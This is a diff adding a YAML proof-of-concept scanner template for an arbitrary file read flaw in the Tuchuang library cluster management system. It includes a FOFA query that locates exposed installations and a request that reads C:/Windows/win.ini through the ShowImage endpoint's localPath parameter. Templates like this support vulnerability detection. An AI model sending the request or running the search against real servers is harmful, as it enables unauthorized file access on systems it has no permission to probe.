@@ -1,0 +1,17 @@
+id: poc-yaml-tuchuang-tushuguan-jiquan-showimage-file-read
+info:
+  name: 图创图书馆集群管理系统 ShowImage 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 图创图书馆集群管理系统
+  fofa: '"广州图创" && country="CN" && body="/interlib/common/"'
+requests:
+- method: GET
+  path: /interlib/report/ShowImage?localPath=C:/Windows/win.ini
+  expression: 'status_code == 200 && status_code == 200 && contains(body,"for 16-bit
+    app support") && contains(body,"[fonts]") && contains(body,"[Mail]")
+
+    '
+variables: {}
+transport: http
